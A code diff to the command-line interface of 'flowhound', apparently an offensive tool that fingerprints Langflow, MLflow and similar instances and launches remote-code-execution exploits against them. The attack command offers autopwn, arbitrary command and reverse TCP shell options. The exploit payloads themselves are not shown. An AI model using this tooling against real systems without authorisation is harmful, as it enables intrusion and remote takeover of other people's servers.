@@ -7,10 +7,10 @@ import click
 from flowhound.cli.banner import banner
 from flowhound.cli.validators import validate_proxy, validate_url
 from flowhound.vulnerabilities.io.database import Database
-from flowhound.vulnerabilities.io.version_detection import get_target_version
+from flowhound.vulnerabilities.io.version_detection import detect_target
 from flowhound.vulnerabilities.payloads import PAYLOAD_MAP
 
-EXPLOIT_TIMEOUT = 60  # seconds before a single exploit attempt is abandoned
+EXPLOIT_TIMEOUT = 20
 logger = logging.getLogger(__name__)
 
 
@@ -61,19 +61,12 @@ def _execute_exploit(
         return future.result(timeout=timeout)
 
 
-@click.command(help="Launch one or more exploits against a Langflow instance.")
+@click.command(help="Launch one or more exploits against a target instance.")
 @click.option(
-    "--url",
-    required=True,
-    help="URL of target Langflow instance",
-    callback=validate_url,
+    "--url", required=True, help="URL of target instance", callback=validate_url
 )
-@click.option(
-    "--username", required=False, default="", help="Target Langflow instance username"
-)
-@click.option(
-    "--password", required=False, default="", help="Target Langflow instance password"
-)
+@click.option("--username", required=False, default="", help="Target instance username")
+@click.option("--password", required=False, default="", help="Target instance password")
 @click.option(
     "--autopwn",
     required=False,
@@ -101,6 +94,12 @@ def _execute_exploit(
     default=None,
     help="LHOST:LPORT for a reverse TCP shell payload (e.g. 192.168.1.10:4444).",
 )
+@click.option(
+    "--application",
+    required=False,
+    default=None,
+    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
+)
 @click.pass_context
 def attack(
     ctx: click.Context,
@@ -111,11 +110,11 @@ def attack(
     proxy: str,
     cmd: str | None,
     reverse_shell: str | None,
+    application: str | None,
 ):
     banner()
     db: Database = ctx.obj
     has_credentials = False
-    logger.info("Checking target Langflow version.")
 
     if cmd and reverse_shell:
         raise click.UsageError("--command and --reverse_shell are mutually exclusive.")
@@ -125,25 +124,33 @@ def attack(
         )
     elif username and password:
         has_credentials = True
-        logger.warning(
-            "Langflow login credentials detected. Results will Include Auth RCE exploit modules."
-        )
 
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
     # Determine payload to use
     payload = _get_payload(cmd=cmd, reverse_shell=reverse_shell)
 
-    # Determine victim langflow version
+    # Identify target application and version
     try:
-        target_version = get_target_version(base_url=url, proxies=proxies)
-    except RuntimeError as e:
-        raise click.ClickException(f"Error retrieving target Langflow version: {e!s}")
+        application, target_version = detect_target(
+            base_url=url, proxies=proxies, application=application
+        )
+    except (RuntimeError, ValueError) as e:
+        raise click.ClickException(f"Error detecting target: {e!s}")
+
+    logger.info(f"Detected {application} version {target_version}.")
+
+    if has_credentials:
+        logger.warning(
+            f"{application} login credentials detected. Results will include Auth RCE exploit modules."
+        )
 
     # Determine vulns & corresponding exploit modules
     try:
         vuln_lst = db.retrieve_vulnerabilities(
-            target_version=target_version, is_auth=has_credentials
+            application=application,
+            target_version=target_version,
+            is_auth=has_credentials,
         )
     except Exception as e:  # noqa: BLE001
         raise click.ClickException(f"Error retrieving exploits: {e!s}")
@@ -155,7 +162,7 @@ def attack(
     for vuln in vuln_lst:
         click.echo("")
         logger.info(
-            f"Launching exploit for {vuln.cve_id} that impacts Langflow versions {vuln.min_impacted_version} through {vuln.max_impacted_version}"
+            f"Launching exploit for {vuln.cve_id} that impacts {vuln.application} versions {vuln.min_impacted_version} through {vuln.max_impacted_version}"
         )
         exploit_module = vuln.get_exploit_instance()
 
@@ -179,11 +186,11 @@ def attack(
             break
 
 
-@click.command(help="Determine target Langflow version.")
+@click.command(help="Detect target application and list known exploits.")
 @click.option(
     "--url",
     required=True,
-    help="URL of target Langflow instance",
+    help="URL of target instance",
     callback=validate_url,
 )
 @click.option(
@@ -193,21 +200,33 @@ def attack(
     help="HTTP(s) proxy to use for network I/O operations",
     callback=validate_proxy,
 )
+@click.option(
+    "--application",
+    required=False,
+    default=None,
+    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
+)
 @click.pass_context
-def sniff(ctx: click.Context, url: str, proxy: dict[str, str] | None):
+def sniff(
+    ctx: click.Context, url: str, proxy: dict[str, str] | None, application: str | None
+):
     db: Database = ctx.obj
 
-    # Determine victim langflow version
-    logger.info("Checking target Langflow version.")
+    # Identify target application and version
     try:
-        target_version = get_target_version(base_url=url, proxies=proxy)
-    except RuntimeError as e:
-        raise click.ClickException(f"Error retrieving target Langflow version: {e!s}")
+        application, target_version = detect_target(
+            base_url=url, proxies=proxy, application=application
+        )
+    except (RuntimeError, ValueError) as e:
+        raise click.ClickException(f"Error detecting target: {e!s}")
 
-    logger.info(f"Retrieving all known exploits for Langflow version {target_version}:")
+    logger.info(f"Detected {application} version {target_version}.")
+    logger.info(
+        f"Retrieving all known exploits for {application} version {target_version}:"
+    )
     try:
         vuln_lst = db.retrieve_vulnerabilities(
-            target_version=target_version, is_auth=True
+            application=application, target_version=target_version, is_auth=True
         )
     except Exception as e:  # noqa: BLE001
         raise click.ClickException(f"Error retrieving exploits: {e!s}")
